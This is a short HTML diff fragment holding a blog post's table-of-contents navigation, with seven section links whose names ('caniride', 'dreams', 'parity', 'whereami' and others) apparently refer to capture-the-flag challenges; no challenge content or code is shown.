+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#caniride"><span class="nav-number">1.</span> <span class="nav-text">caniride</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dreams"><span class="nav-number">2.</span> <span class="nav-text">dreams</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#parity"><span class="nav-number">3.</span> <span class="nav-text">parity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#really-obnoxious-problem"><span class="nav-number">4.</span> <span class="nav-text">really obnoxious problem</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wah"><span class="nav-number">5.</span> <span class="nav-text">wah</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#whatsmyname"><span class="nav-number">6.</span> <span class="nav-text">whatsmyname</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#whereami"><span class="nav-number">7.</span> <span class="nav-text">whereami</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
